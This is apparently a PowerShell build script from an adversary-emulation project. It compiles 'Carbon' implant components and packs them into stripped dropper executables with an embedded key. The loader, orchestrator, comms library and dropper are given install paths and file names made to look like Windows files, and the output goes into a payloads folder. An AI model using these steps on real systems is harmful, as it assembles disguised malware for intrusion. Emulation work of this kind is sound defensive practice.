$workingPath = Get-Location

# set environment variable PATH+=";C:\tools\msys64\mingw64\bin"
# set environment variable MINGW64_ROOT="C:\Tools\msys64\mingw64"

# path: Resources\Carbon\CarbonInstaller\Loader
cd $workingPath\CarbonInstaller\Loader

x86_64-w64-mingw32-g++ -I include\ -static -shared -std=c++20 -Wall -Wextra -Werror -o bin\loader.dll src\*.cpp

### Orchestrator
cd $workingPath\Orchestrator

.\build.ps1

### CommLib

cd $workingPath\commlib

cmake -G "Visual Studio 17 2022" -DCMAKE_TOOLCHAIN_FILE="C:\vcpkg\scripts\buildsystems\vcpkg.cmake" -S . -B build -D CARBON_HOME_DIR="C:\\Program Files\\Windows NT" -D CONFIG_FILE_PATH="C:\\Program Files\\Windows NT\\setuplst.xml" -D FINISHED_TASKS_PATH="C:\\Program Files\\Windows NT\\2028\\traverse.gif"; 
cmake --build build --config Release; 

cp .\build\src\Release\commlib.dll .\bin\commlib.dll;
strip -s bin\commlib.dll
objdump --syms bin\commlib.dll

### CarbonInstaller\Loader

cd $workingPath\CarbonInstaller\Loader

x86_64-w64-mingw32-g++ -I include/ -static -shared -std=c++20 -Wall -Wextra -Werror -o bin/loader.dll src/*.cpp
strip -s bin/loader.dll

### CarbonInstaller\Dropper

cd $workingPath\CarbonInstaller\Dropper

# choco install python
# pip install pycryptodome

rm src/components.cpp 
python add_resources.py --config-path resources/carbon_w1_config --loader-path ../Loader/bin/loader.dll --orchestrator-path ../../Orchestrator/bin/MSSVCCFG.dll --commslib-path ../../CommLib/bin/commlib.dll -o src/components.cpp -k f2d4560891bd948692c28d2a9391e7d9 -l DEBUG
x86_64-w64-mingw32-g++ -I include/ -static -std=c++20 -lstdc++fs -Wall -Wextra -Werror -o bin/dropper_w1.exe src/*.cpp
strip -s bin/dropper_w1.exe 
objdump --syms bin/dropper_w1.exe 
cp bin/dropper_w1.exe ../../../payloads/epic/dropper.exe

rm src/components.cpp 
python add_resources.py --config-path resources/carbon_w2_config --loader-path ../Loader/bin/loader.dll --orchestrator-path ../../Orchestrator/bin/MSSVCCFG.dll --commslib-path ../../CommLib/bin/commlib.dll -o src/components.cpp -k f2d4560891bd948692c28d2a9391e7d9 -l DEBUG
x86_64-w64-mingw32-g++ -I include/ -static -std=c++20 -lstdc++fs -Wall -Wextra -Werror -o bin/dropper_w2.exe src/*.cpp
strip -s bin/dropper_w2.exe
objdump --syms bin/dropper_w2.exe
cp bin/dropper_w2.exe ../../../payloads/carbon/carbon_installer_3.exe

rm src/components.cpp 
python add_resources.py --config-path resources/carbon_dc_config --loader-path ../Loader/bin/loader.dll --orchestrator-path ../../Orchestrator/bin/MSSVCCFG.dll --commslib-path ../../CommLib/bin/commlib.dll -o src/components.cpp -k f2d4560891bd948692c28d2a9391e7d9 -l DEBUG
x86_64-w64-mingw32-g++ -I include/ -static -std=c++20 -lstdc++fs -Wall -Wextra -Werror -o bin/dropper_dc.exe src/*.cpp
strip -s bin/dropper_dc.exe
objdump --syms bin/dropper_dc.exe
cp bin/dropper_dc.exe ../../../payloads/carbon/carbon_installer_2.exe

#End

cd $workingPath
